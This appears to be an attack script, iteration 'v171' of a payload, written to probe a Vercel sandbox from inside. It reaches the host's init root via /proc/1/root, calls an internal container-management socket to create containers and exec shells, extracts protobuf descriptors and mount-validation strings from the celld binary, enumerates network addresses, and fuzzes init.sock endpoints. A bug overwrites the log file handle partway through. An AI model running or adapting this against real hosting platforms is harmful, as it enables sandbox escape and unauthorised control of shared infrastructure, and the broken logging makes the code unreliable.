# -*- coding: utf-8 -*-
"""v171 payload: ProcessService/Wait 查 Exec 状态 + Process descriptor + Mount 校验逻辑 + 网络 IP
输出 /vercel/sandbox/v171c.out"""
import socket, struct, time, json, os, signal, re, ctypes, subprocess

OUT = '/vercel/sandbox/v171c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PROCS = '/vercel.hive.cell.api.processes.v1.ProcessService'


def log(s, maxlen=450):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def find_proc(comm_list):
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm in comm_list:
                try:
                    cl = open('/proc/%s/cmdline' % d).read()[:120].replace('\x00', ' ')
                except Exception:
                    cl = '?'
                return d, comm, cl
    return None


# ============ 1: Create yes + Start + Exec ============
log('=== 1 setup ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'yes'}).encode(), t=8)
log('Create yes -> %s %r' % (st, pay[:150]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
proc_id = None
if cid:
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2[:150]))
    time.sleep(1)
    f = find_proc(['yes'])
    log('yes pid=%s' % (f[0] if f else None))
    # Exec
    body = json.dumps({'container_id': cid,
                       'process': {'command': '/bin/sh', 'arguments': ['-c', 'sleep 300']}}).encode()
    st3, pay3 = raw_req(CELL, '%s/Exec' % CTRS, body, t=6)
    log('Exec -> %s %r' % (st3, pay3[:250]))
    mm = re.search(rb'processId["\s:]+([A-Za-z0-9_-]+)', pay3)
    if mm:
        proc_id = mm.group(1).decode()
        log('procId=%s' % proc_id)

# ============ 2: ProcessService/Wait ============
log('=== 2 process wait ===')
if proc_id:
    for body in [{'process_id': proc_id}, {'processId': proc_id}, {'id': proc_id}, {'pid': proc_id}]:
        st4, pay4 = raw_req(CELL, '%s/Wait' % PROCS, json.dumps(body).encode(), t=4)
        if '404' not in st4:
            log('PWait %s -> %s %r' % (body, st4, pay4[:300]))
    # 也试 containers Wait with process
    for body in [{'container_id': cid, 'process_id': proc_id},
                 {'container_id': cid, 'processId': proc_id}]:
        st5, pay5 = raw_req(CELL, '%s/Wait' % CTRS, json.dumps(body).encode(), t=4)
        log('CWait %s -> %s %r' % (body, st5, pay5[:300]))

# ============ 3: Process descriptor 精确提取 ============
log('=== 3 process desc ===')
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    # process.proto descriptor: 找 proto3\n\x13types/process.proto 后的 Process 消息
    i = data.find(b'\x13types/process.proto\x12\x14vercel.hive.types.v1')
    log('proc proto at 0x%x' % i)
    if i < 0:
        i = data.find(b'types/process.proto')
        log('fallback at 0x%x' % i)
    if i > 0:
        seg = data[i:i + 2500]
        log('PROTO %r' % seg)
except Exception as e:
    log('PROTO EXC %s' % e)

# ============ 4: Mount 校验逻辑 ============
log('=== 4 mount val ===')
try:
    data = open(R + '/opt/vercel/celld', 'rb').read()
    for kw in [b'invalid destination', b'invalid path', b'mount mode unspecified', b'missing source',
               b'missing destination', b'invalid mount']:
        for mm in re.finditer(re.escape(kw), data):
            s = max(0, mm.start() - 500)
            seg = data[s:mm.end() + 300]
            log('VAL %s @0x%x: %r' % (kw, mm.start(), seg[-900:]))
            break
except Exception as e:
    log('VAL EXC %s' % e)

# ============ 5: 网络 IP ============
log('=== 5 net ip ===')
try:
    log('FIB: %s' % open('/proc/1/net/fib_trie').read()[:2000])
except Exception as e:
    log('FIB EXC %s' % e)
try:
    log('FIB6: %s' % open('/proc/1/net/fib_trie6').read()[:800])
except Exception as e:
    log('FIB6 EXC %s' % e)
# ioctl 读 IP
try:
    import fcntl
    for ifname in ['eth0', 'lo']:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip = socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', ifname.encode()[:15]))[20:24])
        log('IP %s=%s' % (ifname, ip))
        s.close()
except Exception as e:
    log('IOCTL EXC %s' % e)

# ============ 6: init.sock 再探 (看 400 详情) ============
log('=== 6 init ===')
sp = '/proc/1/root/volumes/run/vercel/share/init.sock'
for p in ['/', '/healthz', '/v1/health', '/v1/sandbox', '/v1/sandbox/status', '/sandbox/status',
          '/v1/init/status', '/init/status', '/v1/start', '/v1/stop', '/v1/ping', '/v1/version']:
    r = subprocess.run(['curl', '-sS', '--max-time', '2', '--unix-socket', sp,
                        '-H', 'Content-Type: application/json', '-d', '{}',
                        'http://unix' + p], capture_output=True, timeout=4)
    out = r.stdout[:200] + r.stderr[:100]
    log('INIT POST %s -> %r' % (p, out))
    if b'404' not in r.stdout and b'400' not in r.stdout and r.stdout:
        log('INIT HIT %s -> %r' % (p, r.stdout[:400]))

log('V171_DONE')
f.close()
